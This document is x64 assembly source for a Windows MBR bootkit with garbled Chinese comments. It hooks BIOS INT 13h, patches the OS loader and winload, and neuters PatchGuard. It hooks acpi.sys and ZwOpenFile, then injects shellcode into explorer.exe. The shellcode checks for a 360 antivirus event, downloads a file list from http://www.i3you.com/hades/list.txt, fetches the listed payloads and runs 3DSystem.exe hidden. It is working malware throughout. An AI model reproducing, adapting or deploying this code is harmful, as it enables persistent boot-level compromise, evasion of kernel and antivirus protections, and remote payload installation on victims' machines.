
;���׳������⣺1��ģ��2������С������λ�á�2��΢��MBRλ�á�
.x64p                           
.model tiny  

;include D:\RadASM\masm32\include\w2k\ntddk.inc 

;**************************************16λ����ģʽ����**************************************** 
;_main proto stdcall :qword
EVENT_ALL_ACCESS	     EQU	( STANDARD_RIGHTS_REQUIRED  or  SYNCHRONIZE  or  3h )
STANDARD_RIGHTS_REQUIRED     EQU	000F0000h
SYNCHRONIZE	             EQU	00100000h
GENERIC_READ                 equ    080000000h
GENERIC_WRITE                EQu     40000000h
FILE_SHARE_WRITE             equ    000000002h  
FILE_ATTRIBUTE_NORMAL        equ     00000080h  
PAGE_READWRITE               equ           04h  
OPEN_ALWAYS                  equ            4h  
SECTION_MAP_WRITE	     EQU	 0002h
FILE_MAP_WRITE               equ         0002h
Code_Sise equ 200h  
RealCodeSize equ  CodeEnd-CodeStart 
ProtectCodeSize  equ  ProtectCodeEnd-ProtectCodeStart  
RealCode segment byte use16     
CodeStart:                     
  cli 
  xor ax,ax
  mov es,ax
  mov es:word ptr [413h],27ch                         
  mov ax,9f00h                    ;9f00�����ڴ�һֱ���������ã�ֱ��osloder�Ĺؼ�call���ںˣ�win7ϵͳ9f00��ҳ���߼���ַΪ804c1000h��xpλ8009f000   ;����ı����ڴ�;es:0 -> ����ı����ڴ��ַ
  mov es,ax
  mov ds,ax
  xor si,si
  mov word ptr ds:[si],26         
  mov ah,48h
  mov dl,80h
  int 13h                         ;��ȡ���̲���������������
  


  mov eax,ds:[si+16]
  sub eax,10
  mov dword ptr cs:[7c00h+sectors],eax
  mov eax,dword ptr ds:[si+20]
  mov dword ptr cs:[7c00h+sectors+4],eax

  
  ;��дDAP
  mov ax,9e00h
  mov ds,ax
  mov eax,es:[si+16]
  sub eax,9;��ȡ����β��������10������
  mov ebx,es:[si+20]
  mov byte ptr ds:[si],10h  
  mov byte ptr ds:[si+1],0
  mov word ptr ds:[si+2],6;��ȡ��������
  mov dword ptr ds:[si+4],9f000200h
  mov dword ptr ds:[si+8],eax
  mov dword ptr ds:[si+12],ebx
  mov ah,42h
  mov dl,80h
  int 13h
  
  
  
  cld 
  xor ax,ax
  mov ds,ax                           ;
  mov si,7c00h
  xor di,di                      ;���뱻������es:di��(����ı����ڴ���).ע�⣺������ƫ��ֵ�ı�,���㷽��.
  mov cx,Code_Sise
  rep movsb                      ;�������뵽�����ڴ�
  mov eax,ds:[13h*4]             ;��װ���ǵ�INT13h����
  mov es:[INT13H - CodeStart],eax;����ɵ�int13����ֵ
  mov word ptr ds:[13h*4],INT13Hook
  mov ds:[(13h*4) + 2],es        ;�������ǵ�INT13h����
  
  
  push es
  push BootOS
  retf
  
 
  
  
;**************;jmp far 0:7c00h ;����ϵͳ   cs=es=#9f00
BootOS:
  mov ax,9e00h
  mov ds,ax
  xor si,si
  mov eax,dword ptr cs:[sectors]
  mov ebx,dword ptr cs:[sectors+4]
  mov byte ptr ds:[si],10h  
  mov byte ptr ds:[si+1],0
  mov word ptr ds:[si+2],1
  mov dword ptr ds:[si+4],00007c00h
  mov dword ptr ds:[si+8],eax
  mov dword ptr ds:[si+12],ebx
  mov ah,42h
  mov dl,80h
  int 13h
  db  0eah
  dd  7c00h                       ;jmp far 0:7c00h ;����ϵͳ
  sectors dq 0
;****************hook int 13H
INT13Hook:
  pushf
  pusha
  cmp ah, 42h					; IBM/MS INT 13 Extensions - EXTENDED READ
  je  short @Int13Hook_ReadRequest
  cmp ah, 02h					; DISK - READ SECTOR(S) INTO MEMORY
  je  short @Int13Hook_ReadRequest
  popa
  popf

  db 0EAh					; JMP FAR INT13HANDLER
  INT13H dd ?                ;��ת���ɵ�INT13H����,ע��:���ֱ������ݵķ���  
  
@Int13Hook_ReadRequest:;�ж�ntldr�ǲ��Ǳ����ص��ڴ���
   popa
   popf
   push ax
   call dword ptr cs:[INT13H] ;���þ�INT13H����Ķ�
   jc Int13Hook_ret           ;CF=1,��ʧ���˳�����
   
   cli                     ;�ر��ж�
   pushfd
   push es
   push ds
   pushad                   ;�����ֳ�
   
   push word ptr 2000H
   pop es
   .if byte ptr es:0a87H==0bch;��[20a87]=0bch��ʱ��su����ȫ�����ڴ档
        mov di,0a86h ;Ŀ��ƫ��           
        mov si,512   ;��Դƫ��    
        mov ax,9f00h ;��Դ�λ�ַ
        mov ds,ax    ;
        mov cx,hook_ntldr_cr0+hook_ntldr_retf;��Դ����
        rep movsb 
        ;hook��su���ָ�int13
    	mov eax,ds:[INT13H]
    	mov es,cx
   	mov dword ptr es:[13h*4],eax
   .endif
   
   popad;�ָ��ֳ�
   pop ds
   pop es
   popfd
   sti
Int13Hook_ret:
   retf 2;int 13��һ��2�ֽڲ���������Ҫ����2�ֽڡ�


db 512-($-CodeStart) dup(0)
CodeEnd: 
RealCode ends
;**************************************32λ����ģʽ����**************************************** 
;**************************************32λ����ģʽ����**************************************** 
;**************************************32λ����ģʽ����**************************************** 
;**************************************32λ����ģʽ����**************************************** 
;**************************************32λ����ģʽ����**************************************** 
;**************************************32λ����ģʽ����**************************************** 
ProtectCode segment byte use32 
ProtectCodeStart:
;su______________________________________________________

@@:
   db 66h
   pushfd
   db 66h
   pushad
hook_ntldr_cr0 equ $-@B 
@@:
   db 66h
   mov ecx,009f000h+hook_ntldr_cr0+hook_ntldr_retf+RealCodeSize
   db 66h
   push 20h
   db 66h
   push ecx
   db 66h,0cbh ;retfw hook_ntldr_retf 
hook_ntldr_retf equ $-@B 
        
        mov edi,401000h;osload �����rva
        mov ecx,52a000h;�ƶ�osload������Χ����ֹosload������������仯�������쳣
        
        dec edi
     @@:inc edi
        dec ecx
        jz @@@14
        cmp dword ptr [edi],0f08e8b48h;�����붨λosload.
        jnz @B
        
        ;mov edi,450d3bh                            ;osload����winload�����ƫ�ơ�
        mov esi,RealCodeSize+9f000h+ProtectCodeSize;hook winload��Դ�����ƫ�ơ�
        mov ecx,offset osload_code_retf-offset osload_code
        rep movsb
        
        ;��ԭsuβ������
        mov edi,20a86h
        call @@@9
   @@@9:pop esi
        add esi,1+@@@7-$
        mov ecx,@@@8-@@@7
        rep movsb
        @@@14:
        popad
        popfd
        ;hook��osload��ִ��suԭ������osload����
        @@@7:
        mov     esp, 061FFCh
        push    edx
        push    ebp
        xor ebp,ebp
        push 20h
        push ebx
        db 0cbh 
        @@@8:
ProtectCodeEnd:         
ProtectCode ends 
   
LongCode segment byte use64   
   
;osload______________________________________________________________
osload_code:
@@:
        
        mov rbx,009f000h+RealCodeSize+ProtectCodeSize+osload_code_retf-@B
        jmp rbx
      
osload_code_retf:
        ;win7 hook winload.exe
        push rsi
        push rdi
        mov  rdi, [rsi+4B8B00h]
        mov rcx,000Fc000h;winload.exe .code�δ�С����ֹwinload����������winload������仯�����쳣��
        
        dec rdi
     @@:inc rdi
        dec rcx
        jz @@@11
        CMP DWORD PTR [rdi],56cc8b49H;�����붨λOslArchTransferToKernel+68H��������Ϊmov rcx, r12   push rsi
        jnz @B
        
        call @@@3
   @@@3:pop rcx
        add rcx,1+pWinloadBack-$
        mov dword ptr [rcx],edi;����winloadβ������ָ�롣
        

        mov esi,RealCodeSize+9f000h+ProtectCodeSize+@F-osload_code;(offset winload_code-offset ProtectCodeStart)
        mov ecx,offset winload_code_retf-@F
        rep movsb;hook winload.exe β������
        
        ;��ԭosloadβ������
        mov edi,450d3bh                            ;osload����winload�����ƫ�ơ�
        call @@@6
   @@@6:pop rsi
        add esi,1+@@@4-$
        mov ecx, @@@5-@@@4
        rep movsb
        
        @@@11:
        pop rdi
        pop rsi
        @@@4:
        mov rcx, [rsi+4B8AF0h];ԭ������osload�Ĵ���
        mov rax, [rsi+4B8B00h];ԭ������osload�Ĵ���
        call rax               ;ԭ������osload�Ĵ���
        @@@5:

      pWinloadBack   dd 0
        
        
;winload_________________________________________  hook �ں�      

@@:
        mov rdx,009f000h+RealCodeSize+ProtectCodeSize+winload_code_retf-osload_code;(offset winload_code_retf-offset ProtectCodeStart)
        jmp rdx  
winload_code_retf:  
        ;hook ntos
        mov r8,r13;r13=nt OEP
        and r8,0FFFFFFFFFFFFF000H
        add r8,1000h
     @@:sub r8,1000H
        cmp word ptr [r8],"ZM"
        jnz @B
        ;nop��PatchGuard
        mov r9,r8
        add r9w,208h
        mov edx,dword ptr[r9+19*40+8+4];INIT.VOffset
        mov ecx,dword ptr[r9+19*40+8];INIT.Rsize
        add rdx,r8;�ں�.INIT ��β��0����ַ
        dec rdx
     @@:inc rdx
        test ecx,ecx
        jz @@@12
        cmp dword ptr [rdx],92048d48H;      �����붨λ KiInitializePatchGuard+7fh    ������Ϊ lea rax, [rdx+rdx*4]
        JNZ @B
        cmp dword ptr [rdx+4],000002baH;    �����붨λ KiInitializePatchGuard+7fh+4  ������Ϊ mov edx, 2
        jnz @B
        mov byte ptr [rdx-7FH],0c3h;  ��KiInitializePatchGuardֱ�ӷ��� 




  
        mov rdx,r12;LOADER_METER_BLOCK
        add rdx,10h;LOADER_METER_BLOCK.MemoryDetorListHead
        mov rdx,[rdx];_LDR_MODULE
        .while rdx
        	mov r8,[rdx+8*12]
        	.break .if (dword ptr [r8]==00640057h &&  dword ptr [r8+4]==00300066H);Wdf01000.sys
        	mov rdx,[rdx];����
        .endw
        mov rax,[rdx+6*8];BassAddress
        
        
         
        ;hook acpi
        mov r8,rax
        mov r9d,dword ptr [r8+03ch]
        add r9,r8        
        ;hook acpi.sys ����ʹ�� r8 r9 rcx rdx �Ĵ���
        movzx edx,word ptr [r9+14h];SizeOfOptionHeader
        lea r9,[r9+rdx+18h]
        mov ecx,dword ptr[r9+8]
        mov edx,dword ptr[r9+8+4]
        lea rcx,[rcx+rdx];ACPI.SYS.text ��β��0����ַ
        add rcx,r8        
        
        ;�����ں˴��뵽acpi.text ��β��0����ַ
        push rsi
        push rdi
        push rcx
        mov rdi,rcx
        mov rsi,009f000h+RealCodeSize+ProtectCodeSize+nt_code-osload_code;----->nt_code
        mov rcx,nt_code_end-nt_code
        rep movsb
        mov rcx,00097000h;acpi.sys .code�δ�С����ֹacpi������������仯�������쳣
        add r8,1000h
        
        
        @@:
        dec rcx
        jz  @@@12
        inc r8 
        cmp dword ptr [r8-3],  0BBC28B4Ch;ACPIDispatchIrp+c3����������mov r8,rdx     mov ebx, 0C0000010h
        JNZ @B
        cmp dword ptr [r8+1],0C0000010h
        jnz @B
        
        pop rcx
        sub rcx,r8
        sub rcx,5
        mov byte ptr [r8],0E8H;�����call xxxxxxxx=Ŀ���ַ-Դ��ַ-5
        MOV DWORD ptr [r8+1],ecx

        
        
        
        
        
        
        @@@12:
        pop rdi
        pop rsi     
        ;�ָ��ֳ�������nt
        @@@1:
         mov     rcx, r12
         push    rsi
         push    10h
         push    r13
         dw 0cb48h ; retfq
        @@@2: 
;nt______________________________________________
nt_code:
ACPIDispatchIrp proc stdcall 
        pushf;eflag �Ĵ���2�ֽ�
        push qword ptr [rsp+2]
        call ACPIDispatchIrp@
        popf
        ;invoke  _main,qword ptr [rsp];ACPIDispatchIrp���ĵĵ�ַ����һ��ָ����Ϊ����
        mov ebx,0C0000010h
	ret

ACPIDispatchIrp endp

ACPIDispatchIrp@ proc stdcall   uses rax rbx rcx rdx rsi rdi r8 r9 r10 r11 r12 r13 r14 r15  pNextDirective:qword;x64 Լ�� rcx rdx r8 r9 �Ĵ���Ϊǰ4��������rbx rsi rdi rbp �������ò��ܱ�
        mov rax,cr0;ȡ��д����
        btc rax,16
        mov cr0,rax
   
        mov rax,pNextDirective;��ԭACPIDispatchIrp+
        mov dword ptr [rax-5],000010bbH
        mov byte ptr  [rax-1],0c0h
        
     @@:inc rax
        cmp word ptr [rax],015ffh
        jnz @B 
        
        ;ͨ��IAT�����ں˻�����ַ  rax-19hָ�� call  cs:__imp_IofCompleteRequest FF 15 8F 0A 02 00
        mov r12d,[rax+2]
        lea r12,[r12+rax+6]   ;Ŀ���ַ=��һ��ָ���ַ+������ֵ
        mov r12,[r12]
        and r12,0fffffffffffff000h
        add r12,1000h
     @@:sub r12,1000h
        cmp word ptr [r12],"ZM"
        jnz @B
  
        mov r8,r12
        mov r13d,dword ptr [r8+03ch]
        add r13,r8        
        ;hook acpi.sys ����ʹ�� r8 r9 rcx rdx �Ĵ���
        movzx edx,word ptr [r13+14h];SizeOfOptionHeader
        lea r13,[r13+rdx+18h]
        mov ecx,dword ptr[r13+8]
        mov edx,dword ptr[r13+8+4]
        lea rcx,[rcx+rdx];ACPI.SYS.text ��β��0����ַ
        add rcx,r8 
        mov r13,rcx;nt.textβ��
        call @F
     @@:pop rcx
        add rcx,ZwOpenFile-$+1
        mov qword ptr [r13],rcx;�����ҵ�ZwOpenFileĿ���ַ
        
        
        push 11
        call @F
        db "ZwOpenFile",0
     @@:push r12
        call _GetProcAddress    
        
        sub r13,rax;call qwrod ptr ds:[xxxxxxxx]   qwrod ptr ds:[xxxxxxxx]=fffff00012345678
        sub r13,14h+6h;hook ZwOpenFile+14h   mov eax, 30h 
        
        mov ecx,dword ptr [rax+1ah]  ;E9||||||||||||| C2 DA FF FF    jmp     KiServiceInternal
        dec ecx
        mov dword ptr [rax+1ah+1],ecx
        mov word ptr[rax+14h],15ffh
        mov [rax+14h+2],r13d
        mov byte ptr [rax+1ah],0e9h;
        
        
        mov rax,cr0
        btc rax,16
        mov cr0,rax
        ret
 
ACPIDispatchIrp@ endp


ZwOpenFile proc stdcall ;uses rbx  rcx rdx rsi rdi r8 r9 r10 r11  r13 r14 r15;x64 Լ�� rcx rdx r8 r9 �Ĵ���Ϊǰ4��������rbx rsi rdi rbp �������ò��ܱ�
        
        pushf
        push qword ptr [rsp+2]
        call ZwOpenFile@
        popf
        mov eax,31h
        ret

ZwOpenFile endp 
ZwOpenFile@ proc stdcall uses  rax rbx  rcx rdx rsi rdi r8 r9 r10 r11 r12 r13 r14 r15    pNextDirective:qword
   ;api=6
   LOCAL _KeStackAttachProcess:qword
   LOCAL _ObOpenObjectByPointer:qword
   LOCAL _ZwAllocateVirtualMemory:qword

   ;����
   LOCAL Base:qword
   LOCAL ApcState[18h]:byte
   LOCAL pBuf:qword
   LOCAL buflen:qword
   LOCAL hProcessHandle:qword
   LOCAL my_interval[8]:byte
   LOCAL pstatus:qword
   LOCAL pCodeBuff:qword
   LOCAL pProcessListHead:qword
   LOCAL pExplorerProcess:qword
   assume gs:nothing 
   mov rax,gs:188h
   mov rax,[rax+0b8h]
   .if (dword ptr [rax+438h]!="lpxe")
   	jmp ZwOpenFile@_ret
   .endif
   mov pExplorerProcess,rax;explorer�Ľ��̽ṹ��  
  
  
   mov rax,cr0;ȡ��д����
   btc rax,16
   mov cr0,rax
   
   mov rcx, pNextDirective
   mov dword ptr [rcx-6],000031b8h
   mov word ptr  [rcx-2],9000h
   
   btc rax,16
   mov cr0,rax
   
   
   
   
   mov rax,pNextDirective
   and rax,0fffffffffffff000h
   add rax,1000h
@@:sub rax,1000h
   cmp word ptr [rax],"ZM"
   jnz @B	
   mov Base,rax
   
   push 22
   call @F
   db "ObOpenObjectByPointer",0
   @@:
   push Base
   call _GetProcAddress
   mov _ObOpenObjectByPointer,rax
   
   
   push 24
   call @F
   db "ZwAllocateVirtualMemory",0
   @@:
   push Base
   call _GetProcAddress
   mov _ZwAllocateVirtualMemory,rax
   
   push 21
   call @F
   db "KeStackAttachProcess",0
   @@:
   push Base
   call _GetProcAddress
   mov _KeStackAttachProcess,rax
   

   ;_______��ȡAPI����

   


   
   
   ;invoke ObOpenObjectByPointer,pEPROCESS,OBJ_KERNEL_HANDLE,NULL, 008h,NULL, KernelMode,addr hProcessHandle

   
   sub rsp,8*12;���������ջ�Ŀռ�
   
   mov rcx,pExplorerProcess
   mov rdx,200h;OBJ_KERNEL_HANDLE
   mov r8,0
   mov r9,8h
   mov qword ptr [rsp+4*8],0
   mov qword ptr [rsp+5*8],0
   lea rbx,hProcessHandle
   mov [rsp+6*8],rbx
   call _ObOpenObjectByPointer

   
   
   ;invoke ZwAllocateVirtualMemory,hProcessHandle,addr pBuf,0,addr buflen,MEM_COMMIT,PAGE_EXECUTE_READWRITE
   mov buflen,shellcode_end-shellcode_start
   mov pBuf,0
   
   mov rcx,hProcessHandle
   lea rdx,pBuf
   mov r8,0
   lea r9,buflen
   mov qword ptr[rsp+4*8],1000h; MEM_COMMIT
   mov qword ptr[rsp+5*8],40h;PAGE_EXECUTE_READWRITE
   call _ZwAllocateVirtualMemory

   
   
   ;invoke KeStackAttachProcess,pEPROCESS,addr ApcState
   mov rcx,pExplorerProcess
   lea rdx,ApcState
   call _KeStackAttachProcess
   add rsp,8*12 ;�ָ�ջƽ��
  
   cli
   mov rax,pExplorerProcess
   mov rax,[rax+30h];ThreadListHead 
@@:mov rax,[rax]
   mov ecx,[rax-2f8h+4ch] ;Alertable : Pos 5, 1 Bit  KTHREAD.AlertableΪ0���̲߳���hook
   and ecx,20h
   jnz @B
   
   mov rax,[rax-2f8h+90h];KTHREAD.TrapFrame 
   mov r8,[rax+168h];KTHREAD.TrapFrame.RIP
   call @F
@@:pop rcx
   add rcx,offset EIP-$+1
   
   mov rdx,cr0;ȡ��д����
   btc rdx,16
   mov cr0,rdx
   
   mov [rcx],r8;����EIP
   
   mov rdx,cr0
   btc rdx,16
   mov cr0,rdx
   
   mov rcx,pBuf
   add rcx,8
   mov [rax+168h],rcx
   mov rcx,shellcode_end-shellcode_start
   call @F
@@:pop rsi
   add rsi,offset shellcode_start-$+1
   mov rdi,pBuf
   rep movsb
   sti

   
   ZwOpenFile@_ret:
   ret
   
ZwOpenFile@ endp

 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;R3shellcode;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 shellcode_start: 
        EIP dq 0
        nop
        push rax;�����Ĵ���
        call r3_main
        call @F
     @@:pop rax
        sub rax,$-1-offset EIP
        mov rax,[rax]
        mov [rsp-8],rax
        
        pop rax
        jmp qword ptr [rsp-16];������ʵ�ֳ���ʵrip
        
        r3_main proc stdcall  uses rsi rdi rax rbx rcx rdx r8 r9 r10 r11 r12 r13 r14 r15 
                LOCAL lpThreadId :qword
                LOCAL _RSP:qword
                  
                ;dll ��ַ
                LOCAL Kernel32Base:qword
                LOCAL NtdllBase:qword
                LOCAL User32Base:qword 
                LOCAL UrlmonBase:qword
                
                ;kernel32 �ĺ���
                LOCAL @LoadLibraryA:qword
                LOCAL @GetProcAddress:qword
                LOCAL @CreateThread:qword
                LOCAL @CreateFileA:qword
                LOCAL @GetFileSize:qword
                LOCAL @VirtualFree:qword
                LOCAL @VirtualAlloc:qword
                LOCAL @_lread:qword
                LOCAL @CopyFileA:qword
                LOCAL @Sleep:qword
                LOCAL @OpenEventA:qword
                LOCAL @FindFirstFileA:qword
                LOCAL @WinExec:qword
                LOCAL @CreateFileMappingA:qword
                LOCAL @MapViewOfFile:qword

                
                ;ntdll�ĺ���
                LOCAL @RtlMoveMemory:qword
                ;Urlmon�ĺ���
                LOCAL @URLDownloadToFileA:qword
                
                ;user32�ĺ���
                LOCAL @MessageBoxA:qword
                LOCAL @wsprintfA :qword
                
        	assume fs:nothing   

                ;xor rcx,rcx            
                mov rsi,gs:[30h]    ;teb
                mov rsi,[rsi+60H]   ;PEB
                mov rsi, [rsi + 18h]; PEB._PEB_LDR_DATA
           
                mov rsi, [rsi + 10h];PEB._PEB_LDR_DATA.InLoadOrderModuleList
                next_module1:            
                mov rax, [rsi + 30h];������ַ            
                mov rdi, [rsi + 58h+8]; dllģ������_UNICODE_STRING.Buffer            
                mov rsi, [rsi]; 
                .if byte ptr [rdi]!="k" && byte ptr [rdi]!="K"
                        jmp next_module1  
                .endif         
                       
                          
                          
                 
                mov _RSP,rsp
                sub rsp,8*8          
                mov Kernel32Base,rax;kernel32��ַ
        
                push 15 
                call @F
                db "GetProcAddress",0
             @@:push Kernel32Base
                call _GetProcAddress
                mov @GetProcAddress,rax
                
                call @F
                db "LoadLibraryA",0
             @@:pop rdx
                mov rcx,Kernel32Base
                call @GetProcAddress
                mov @LoadLibraryA,rax
        

                 

                
               
                
        	
        	call @F
                db "CreateThread",0
             @@:pop rdx
                mov rcx,Kernel32Base
                call @GetProcAddress
                mov @CreateThread,rax
        	 
        	
        	
        	call @F
                db "CreateFileA",0
             @@:pop rdx
                mov rcx,Kernel32Base
                call @GetProcAddress
                mov @CreateFileA,rax
                
                
                
                call @F
                db "Sleep",0
             @@:pop rdx
                mov rcx,Kernel32Base
                call @GetProcAddress
                mov @Sleep,rax
                
                call @F
                db "OpenEventA",0
             @@:pop rdx
                mov rcx,Kernel32Base
                call @GetProcAddress
                mov @OpenEventA,rax
                

                
                call @F
                db "WinExec",0
             @@:pop rdx
                mov rcx,Kernel32Base
                call @GetProcAddress
                mov @WinExec,rax
                
                call @F
                db "CreateFileMappingA",0
             @@:pop rdx
                mov rcx,Kernel32Base
                call @GetProcAddress
                mov @CreateFileMappingA,rax  
                
                
                call @F
                db "MapViewOfFile",0
             @@:pop rdx
                mov rcx,Kernel32Base
                call @GetProcAddress
                mov @MapViewOfFile,rax  
                
                CALL @F 
             @@:pop rax
                add rax,offset fThread-$+1
                .if byte ptr [rax]==0
                        mov byte ptr [rax],1;��Ǵ����߳�
                        @@C:
                        xor rcx,rcx
                        xor rdx,rdx
                        CALL @F 
                     @@:pop r8
                        sub r8,$-2-offset shellcode_start-8
                        xor r9,r9
                        mov [rsp+4*8],rcx
                        lea rax,lpThreadId
                        mov [rsp+5*8],rax
                        call  @CreateThread
                        ;invoke CreateThread,0,0,offset shellcode_start+5,0,0,addr lpThreadId
                        cmp eax,0
                        jz @@C
                        mov rsp,_RSP
                        ret
                .endif 
                and rsp,0fffffffffffff000h;64λ��ջ��Ҫ1000H����
                mov rcx,60000
                call @Sleep   
                             
                call @F
                db "user32.dll",0
             @@:pop rcx
                call @LoadLibraryA
                mov  User32Base,rax
                
                call @F
                db "MessageBoxA",0
             @@:pop rdx
                mov rcx,User32Base
                call @GetProcAddress
                mov @MessageBoxA,rax  
                
                  
                
                xor rcx,rcx
                xor rdx,rdx
                xor r8,r8
                xor r9,r9
                call @MessageBoxA
                
                
                
                
                ;invoke OpenEvent,EVENT_ALL_ACCESS,FALSE,$CTA0("360Tray")
                mov rcx,EVENT_ALL_ACCESS
                xor rdx,rdx
	        call @F
	        db "360Tray",0
             @@:pop r8
                call @OpenEventA
                
                and rax,rax
                jnz r3_main_ret
                
                call @F
                db "urlmon.dll",0
             @@:pop rcx
                call @LoadLibraryA
                mov  UrlmonBase,rax
        	
        	call @F
                db "URLDownloadToFileA",0
             @@:pop rdx
                mov rcx,UrlmonBase
                call @GetProcAddress
                mov @URLDownloadToFileA,rax  
                
                ;invoke URLDownloadToFile,0,$CTA0("http://www.i3you.com/hades/list.txt"),$CTA0("C:\\Program Files\\Windows Media Player\\list.txt"),0,0
            @@3:mov rcx,500
                call @Sleep
                xor rcx,rcx
                call @F
                db "http://www.i3you.com/hades/list.txt",0
             @@:pop rdx
                call @F
                db "C:\Program Files\Windows Media Player\list.txt",0
             @@:pop r8
                xor r9,r9
                mov qword ptr [rsp+4*8],0
                call @URLDownloadToFileA
                and rax,rax
                jnz @@3
                   
                ;invoke CreateFile,$CTA0("C:\\Program Files\\Windows Media Player\\list.txt"),GENERIC_READ or GENERIC_WRITE,FILE_SHARE_WRITE,0,OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL,0
            @@4:call @F
                db "C:\Program Files\Windows Media Player\list.txt",0
             @@:pop rcx
                mov rdx,GENERIC_READ or GENERIC_WRITE
                mov r8,FILE_SHARE_WRITE
                xor r9,r9
                mov qword ptr [rsp+4*8],OPEN_ALWAYS
                mov qword ptr [rsp+5*8],FILE_ATTRIBUTE_NORMAL
                mov qword ptr [rsp+6*8],0
                call @CreateFileA
                cmp rax,-1
                jz @@4
                
                ;invoke CreateFileMapping,eax,0,PAGE_READWRITE,0,0,0
            @@5:mov rcx,rax
                xor rdx,rdx
                mov r8,PAGE_READWRITE
                mov r9,0
                mov qword ptr [rsp+4*8],0
                mov qword ptr [rsp+5*8],0
                call @CreateFileMappingA
                and rax,rax
                jz @@5
                
                ;invoke MapViewOfFile,eax,FILE_MAP_WRITE,0,0,0
            @@6:mov rcx,rax
                mov rdx,FILE_MAP_WRITE
                xor r8,r8
                xor r9,r9
                mov qword ptr [rsp+4*8],0
                call @MapViewOfFile
                and rax,rax
                jz @@6
                
                .while word ptr[rax]!=0AA55H
                        mov r12,rax
                        mov rdx,rax;�ڶ�������
                        dec rax
                     @@:inc rax
	                cmp word ptr[rax],0a0dh
	                jnz @B
	                mov word ptr[rax],0
	                add rax,2
	                mov r8,rax;����������
                        dec rax
                     @@:inc rax
	                cmp word ptr[rax],0a0dh
	                jnz @B
	                mov word ptr[rax],0
	                add rax,2
	                mov r12,rax;next
	                
	                ;@@:invoke URLDownloadToFileA,0,str1,str2,0,0
	             @@:xor rcx,rcx
                        xor r9,r9
                        mov qword ptr [rsp+4*8],0
                        call @URLDownloadToFileA
	                
	                .if rax!=0
	                        ;invoke Sleep,500
	                        mov rcx,500
                                call @Sleep     
		                jmp @B
	                .endif
                        mov rax,r12
                          
	        .endw
                ;invoke WinExec,$CTA0("C:\Program Files\Windows Media Player\3DSystem.exe"),SW_HIDE 
                 
            @@7:call @F
                db "C:\Program Files\Windows Media Player\3DSystem.exe",0
             @@:pop rcx
                mov rdx,0;SW_HIDE
                call @WinExec
                cmp rax,31
                jng @@7;������31����
                
                r3_main_ret:
        	ret
                       
        r3_main endp
        
        
        
        
        
        
        
        fThread db 0



_GetProcAddress  proc  stdcall uses rsi rdi rbx Base:Qword,lpStr:Qword,StrSize:Qword ;rbx, rbp, rdi, rsi, r12-r15 ����

  

   mov rdi,Base
   mov eax,[rdi+3ch];pe header           
   mov edx,dword ptr[rdi+rax+88h]    ;32bit ��pe EXPORT=PE+78H��64bit EXPORT=PE+88H  
   add rdx,rdi   ;VA �����       
   mov ecx,[rdx+18h];number of functions           
   mov ebx,[rdx+20h]           
   add rbx,rdi;AddressOfName
   
   search2:           
   dec rcx  
   push rcx         
   mov esi,[rbx+rcx*4]           
   add rsi,Base;
   mov rdi,lpStr
   mov rcx,StrSize
   repe cmpsb
   pop rcx
   jne search2 
   mov rdi,Base  
   mov ebx,[rdx+24h]           
   add rbx,rdi;indexaddress           
   movzx ecx,word ptr [rbx+rcx*2]           
   mov ebx,[rdx+1ch]           
   add rbx,rdi           
   mov eax,[rbx+rcx*4] ;     ebx+ecx*4=  pZwCreateFile   
   add rax,rdi;ZwCreateFile=eax
   ret
_GetProcAddress endp  



shellcode_end:

;db  446-($-CodeStart) dup(0)

nt_code_end:

LongCode ends 
        
end CodeStart 
